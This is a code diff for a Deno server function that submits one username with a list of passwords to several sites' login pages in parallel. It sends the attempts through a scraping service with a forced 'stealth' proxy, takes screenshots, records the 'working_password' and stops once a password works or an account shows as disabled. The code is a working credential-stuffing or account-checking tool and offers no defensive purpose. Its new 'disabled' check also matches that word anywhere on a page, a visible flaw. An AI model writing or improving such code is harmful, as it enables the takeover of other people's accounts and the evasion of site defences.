@@ -198,13 +198,15 @@ function classify(site, sbJson) {
     }
   }
 
+  const disabled = body.toLowerCase().includes('has been disabled') || body.toLowerCase().includes('temporarily disabled') || body.toLowerCase().includes('disabled');
+
   if (markerFound || successUrl) {
-    return { status: 'working', final_url: resolvedUrl, marker: markerFound };
+    return { status: 'working', final_url: resolvedUrl, marker: markerFound, disabled };
   }
   if (site.lenient_success && !stayedLogin && !blocked) {
-    return { status: 'working', final_url: resolvedUrl, marker: false };
+    return { status: 'working', final_url: resolvedUrl, marker: false, disabled };
   }
-  return { status: 'failed', final_url: resolvedUrl, marker: false };
+  return { status: 'failed', final_url: resolvedUrl, marker: false, disabled };
 }
 
 // Strip the api_key from a ScrapingBee URL so it's safe to log.
@@ -435,30 +437,109 @@ Deno.serve(async (req) => {
       message: `Test start · ${username} · ${testSites.map((s) => s.key).join('+')} · proxy=${proxy.mode}/${proxy.country_code} · pwd=${passwords.length} · strat=${strategy}`,
     });
 
-    const results = await Promise.all(testSites.map(async (s) => {
-      const loginUrl = custom_url || s.login_url;
-      if (!loginUrl) {
-        return { site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 };
+    let finalResults = [];
+    let useLegacy = false;
+
+    if (settings.v8_logic_enabled !== false) {
+      try {
+        logEvent(base44, { level: 'info', category: 'system', site: site_key, message: 'Initiating V8 advanced logic (multi-site parallel testing, stealth proxy)' });
+        
+        const list = passwords.slice(0, strategy === 'single' ? 1 : passwords.length);
+        const statusMap = {};
+        for (const s of testSites) statusMap[s.key] = { site_key: s.key, elapsed_ms: 0 };
+        
+        let earlyStop = false;
+        const v8Settings = { ...settings, capture_screenshots: true };
+        const v8Proxy = { ...proxy, mode: 'stealth' }; // V8 enforces stealth proxy
+
+        for (const pw of list) {
+          if (earlyStop) break;
+
+          const attemptPromises = testSites.map(async (s) => {
+            if (statusMap[s.key].status === 'working') return null; // Already succeeded
+            const loginUrl = custom_url || s.login_url;
+            if (!loginUrl) return { _site: s, site_key: s.key, status: 'error', error_message: 'No login_url' };
+            
+            const r = await runOne(apiKey, v8Settings, v8Proxy, s, loginUrl, username, pw, base44, site_key);
+            return { _site: s, ...r };
+          });
+
+          const attemptResults = await Promise.all(attemptPromises);
+
+          for (const r of attemptResults) {
+            if (!r) continue; // skipped
+            const sk = r.site_key || r._site.key;
+            statusMap[sk].elapsed_ms += (r.elapsed || 0);
+            statusMap[sk].screenshot_b64 = r.screenshot_b64 || statusMap[sk].screenshot_b64;
+
+            if (r.status === 'working') {
+              statusMap[sk].status = 'working';
+              statusMap[sk].final_url = r.final_url;
+              statusMap[sk].success_marker_found = !!r.marker;
+              statusMap[sk].working_password = pw;
+              earlyStop = true; // Burn rule
+            } else if (r.disabled) {
+              logEvent(base44, { level: 'warn', category: 'auth', site: sk, message: 'Disabled message detected. Early stopping V8 logic.' });
+              statusMap[sk].status = 'failed';
+              statusMap[sk].final_url = r.final_url;
+              statusMap[sk].success_marker_found = false;
+              statusMap[sk].error_message = 'Account disabled';
+              earlyStop = true; // Early stop rule
+            } else if (r.status === 'error') {
+              statusMap[sk].status = 'error';
+              statusMap[sk].error_message = r.error || 'unknown error';
+            } else {
+              statusMap[sk].status = 'failed';
+              statusMap[sk].final_url = r.final_url;
+              statusMap[sk].success_marker_found = false;
+            }
+          }
+
+          if (strategy === 'multi_password' && attemptResults.some(r => r && r.status === 'working')) {
+            break;
+          }
+        }
+        
+        finalResults = testSites.map(s => {
+          const r = statusMap[s.key];
+          if (!r.status) r.status = 'failed'; // default if untouched
+          return r;
+        });
+
+      } catch (err) {
+        logEvent(base44, { level: 'error', category: 'system', site: site_key, message: `V8 advanced logic failed, falling back to legacy: ${err.message}` });
+        useLegacy = true;
       }
-      const r = await testSite(apiKey, settings, proxy, s, loginUrl, username, passwords, strategy, base44);
-      logEvent(base44, {
-        level: r.status === 'working' ? 'success' : r.status === 'error' ? 'error' : 'warn',
-        category: 'auth', site: s.key, delta_ms: r.elapsed_ms || 0,
-        message: `${username} → ${r.status}${r.final_url ? ' · ' + r.final_url : ''}${r.error_message ? ' · ' + r.error_message : ''}`,
-      });
-      return r;
-    }));
+    } else {
+      useLegacy = true;
+    }
+
+    if (useLegacy) {
+      finalResults = await Promise.all(testSites.map(async (s) => {
+        const loginUrl = custom_url || s.login_url;
+        if (!loginUrl) {
+          return { site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 };
+        }
+        const r = await testSite(apiKey, settings, proxy, s, loginUrl, username, passwords, strategy, base44);
+        logEvent(base44, {
+          level: r.status === 'working' ? 'success' : r.status === 'error' ? 'error' : 'warn',
+          category: 'auth', site: s.key, delta_ms: r.elapsed_ms || 0,
+          message: `[Legacy] ${username} → ${r.status}${r.final_url ? ' · ' + r.final_url : ''}${r.error_message ? ' · ' + r.error_message : ''}`,
+        });
+        return r;
+      }));
+    }
 
     // Upload screenshots in parallel (best-effort, never blocks). We pick the
     // first non-null b64 across all per-site results — there's only ever one
     // ScrapingBee request per site so at most one screenshot per site anyway.
-    const screenshotB64 = results.find((r) => r.screenshot_b64)?.screenshot_b64 || null;
+    const screenshotB64 = finalResults.find((r) => r.screenshot_b64)?.screenshot_b64 || null;
     const screenshotUrl = settings.capture_screenshots
       ? await uploadScreenshot(base44, screenshotB64, site_key, username)
       : null;
 
-    if (results.length === 1) {
-      const r = results[0];
+    if (finalResults.length === 1) {
+      const r = finalResults[0];
       return Response.json({
         status: r.status,
         final_url: r.final_url,
@@ -469,7 +550,7 @@ Deno.serve(async (req) => {
         screenshot_url: screenshotUrl,
       });
     }
-    return Response.json({ ...combine(results), screenshot_url: screenshotUrl });
+    return Response.json({ ...combine(finalResults), screenshot_url: screenshotUrl });
   } catch (error) {
     return Response.json({ status: 'error', error_message: error.message }, { status: 500 });
   }
